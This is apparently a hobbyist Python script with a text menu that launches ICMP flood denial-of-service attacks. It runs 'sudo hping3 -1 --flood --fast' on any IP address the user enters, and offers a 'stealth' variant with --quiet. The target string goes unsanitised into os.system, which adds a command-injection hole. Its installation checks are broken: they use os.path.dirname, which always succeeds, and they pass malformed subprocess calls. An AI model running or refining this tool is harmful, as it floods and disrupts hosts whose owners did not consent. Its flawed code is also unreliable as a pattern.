import math
import random
import subprocess
import sys
import os
import time



def menu():
    os.system('clear')
    print('//______________________')
    print('//     ___       ___    ')
    print('//     |  |      |  |   ')
    print('//     |__|      |__|   ')
    print('//                      ')
    print('//       ----------     ')
    print('//______________________')
    print('')

    print('------------------------------')
    print('-------------MENU-------------')
    print('1. HPING3 ATTACK [dos/hping3]')
    print('2. STEALTH ATTACK [dos/hping3]')
    print('3. QUIT')
    print('------------------------------')

    Opt = input('>> ')

    if Opt == '1':
        reg()
    elif Opt == '2':
        stealth()
    elif Opt == '3':
        print('Exiting..')
        time.sleep(1.5)
        sys.exit()
    else:
        print('Unknown Command..')
        time.sleep(1.75)
        menu()

def reg():
    print('')
    print('')
    print('')
    print('')
    print('')
    print('')
    print('')
    print('')
    print('')
    print('')
    print('')
    print('')
    print('')
    print('')
    print('')

    print('Do you want to continue? Y/n')
    Opt = input('>> ')

    if Opt == 'Y':
        print('Okay!')
        URL = input('What is the url IP?\n>> ')
        print('Running..')
        time.sleep(2)
        os.system(f"sudo hping3 -1 --flood --fast {URL}")
        print('Done!')
        time.sleep(3)
        menu()
    elif Opt == 'y':
        print('Okay!')
        URL = input('What is the url IP?\n>> ')
        print('Running..')
        time.sleep(2)
        os.system(f"sudo hping3 -1 --flood --fast {URL}")
        print('Done!')
        time.sleep(3)
        menu()
    elif Opt == 'N':
        print('Stopping..')
        time.sleep(1.5)
        menu()
    elif Opt == 'n':
        print('Stopping..')
        time.sleep(1.5)
        menu()
    menu()

def stealth():
    print('')
    print('')
    print('')
    print('')
    print('')
    print('')
    print('')
    print('')
    print('')
    print('')
    print('')
    print('')
    print('')
    print('')
    print('')

    print('Do you want to continue? Y/n')
    Opt = input('>> ')

    if Opt == 'Y':
        print('Okay!')
        URL = input('What is the url IP?\n>> ')
        print('Running..')
        time.sleep(2)
        os.system(f"sudo hping3 -1 --flood --fast --quiet {URL}")
        print('Done!')
        time.sleep(3)
        menu()
    elif Opt == 'y':
        print('Okay!')
        URL = input('What is the url IP?\n>> ')
        print('Running..')
        time.sleep(2)
        os.system(f"sudo hping3 -1 --flood --fast --quiet {URL}")
        print('Done!')
        time.sleep(3)
        menu()
    elif Opt == 'N':
        print('Stopping..')
        time.sleep(1.5)
        menu()
    elif Opt == 'n':
        print('Stopping..')
        time.sleep(1.5)
        menu()
    menu()

def not_menu():
    print('//______________________')
    print('//     ___       ___    ')
    print('//     |  |      |  |   ')
    print('//     |__|      |__|   ')
    print('//                      ')
    print('//       ----------     ')
    print('//______________________')
    print('')

    print('locating \'PYTHON3\'..')
    time.sleep(2)
    if os.path.dirname('/usr/share/python3'):
        print('python3[YES]')
        time.sleep(1)
    else:
        print('PYTHON3 not installed')
        print('PLZ INSTALL!!')
        sys.exit()

    print('locating \'GNOME_TERMINAL\'..')
    time.sleep(2)
    if os.path.dirname('/usr/bin/gnome-terminal'):
        print('gnome-terminal[YES]')
        time.sleep(1)
    else:
        print('GNOME-TERMINAL not installed')
        a = input('OPTIONAL - Would you like to install? Y/n')
        
        if a == 'Y':
            subprocess.run(["sudo apt install gnome-terminal"])
        elif a == 'y':
            subprocess.run(["sudo apt install gnome-terminal"])
        elif a =='N':
            pass
        elif a == 'n':
            pass
    print('locating \'HPING3\'..')
    time.sleep(2)
    if os.path.dirname('/usr/sbin/hping3'):
        print('hping3[YES]')
        time.sleep(1)
    else:
        print('HPING3 not installed')
        a = input('OPTIONAL - Would you like to install? Y/n')
        
        if a == 'Y':
            subprocess.run(["sudo apt install hping3"])
        elif a == 'y':
            subprocess.run(["sudo apt install hping3"])
        elif a =='N':
            pass
        elif a == 'n':
            pass
    
    menu()

    

def check():
    if os.path.isfile("source/.check"):
        menu()
    else:
        os.system("touch source/.check")
        not_menu()

check()
